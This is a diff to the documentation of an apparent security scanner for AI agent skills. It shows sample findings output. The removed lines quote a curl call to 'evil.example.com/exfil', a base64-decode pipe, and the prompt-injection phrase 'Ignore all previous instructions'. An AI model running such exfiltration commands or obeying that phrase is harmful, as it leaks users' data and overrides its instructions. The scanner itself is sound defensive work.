@@ -38,13 +38,10 @@ Per-skill results with tree-style findings:
 ```
 [1/5] ✓ my-skill (12ms)
 [2/5] ! risky-skill (8ms)
-  ├─ HIGH: suspicious URL pattern (scripts/run.sh:14)
-  │  > curl http://evil.example.com/exfil
-  └─ MEDIUM: base64 encoded content (SKILL.md:42)
-     > echo "aGVsbG8=" | base64 -d
+  ├─ MEDIUM: URL used in command context (scripts/run.sh:14)
+  └─ HIGH: base64 decode pipe may hide malicious content (SKILL.md:42)
 [3/5] ✗ bad-skill (5ms)
   └─ CRITICAL: prompt injection attempt (SKILL.md:3)
-     > Ignore all previous instructions
 ```
 
 Summary box:
